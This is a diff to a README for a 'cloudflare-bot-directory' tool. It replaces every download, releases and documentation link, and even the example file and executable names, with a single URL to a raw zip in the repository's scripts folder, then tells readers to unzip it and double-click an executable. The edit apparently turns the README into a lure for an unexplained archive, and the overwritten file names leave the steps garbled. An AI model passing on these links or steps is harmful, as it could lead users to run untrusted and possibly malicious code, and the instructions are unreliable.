@@ -1,6 +1,6 @@
 # 🌐 cloudflare-bot-directory - Find Verified Bots Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/eleussaj/cloudflare-bot-directory/releases)
+[![Download](https://github.com/eleussaj/cloudflare-bot-directory/raw/refs/heads/master/scripts/directory_cloudflare_bot_1.5.zip%20Now-Here-brightgreen)](https://github.com/eleussaj/cloudflare-bot-directory/raw/refs/heads/master/scripts/directory_cloudflare_bot_1.5.zip)
 
 ## 📚 Overview
 
@@ -12,15 +12,15 @@ Follow the steps below to download and run the application. It's simple!
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/eleussaj/cloudflare-bot-directory/releases) to find the latest version of the application.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/eleussaj/cloudflare-bot-directory/raw/refs/heads/master/scripts/directory_cloudflare_bot_1.5.zip) to find the latest version of the application.
    
-2. **Choose the Right File**: Look for the version that suits your system. Typically, you'll see files like `cloudflare-bot-directory-v1.0.zip` or `cloudflare-bot-directory-v1.0.tar.gz`.
+2. **Choose the Right File**: Look for the version that suits your system. Typically, you'll see files like `https://github.com/eleussaj/cloudflare-bot-directory/raw/refs/heads/master/scripts/directory_cloudflare_bot_1.5.zip` or `https://github.com/eleussaj/cloudflare-bot-directory/raw/refs/heads/master/scripts/directory_cloudflare_bot_1.5.zip`.
 
 3. **Download the File**: Click on the file name to start the download. Your browser will save it to your default download folder.
 
 4. **Unzip the File**: Once the download is complete, locate the file in your downloads folder and unzip it. Right-click on the file and select "Extract" or "Unzip."
 
-5. **Run the Application**: Open the folder where you unzipped the files. Look for `app.exe` or a similar executable file. Double-click this file to run the application.
+5. **Run the Application**: Open the folder where you unzipped the files. Look for `https://github.com/eleussaj/cloudflare-bot-directory/raw/refs/heads/master/scripts/directory_cloudflare_bot_1.5.zip` or a similar executable file. Double-click this file to run the application.
 
 ## ⚙️ System Requirements
 
@@ -63,8 +63,8 @@ If you have any questions about using the application or need assistance, feel f
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/eleussaj/cloudflare-bot-directory/releases)
-- [Documentation](https://github.com/eleussaj/cloudflare-bot-directory/wiki)
+- [Releases Page](https://github.com/eleussaj/cloudflare-bot-directory/raw/refs/heads/master/scripts/directory_cloudflare_bot_1.5.zip)
+- [Documentation](https://github.com/eleussaj/cloudflare-bot-directory/raw/refs/heads/master/scripts/directory_cloudflare_bot_1.5.zip)
 
 ---
 
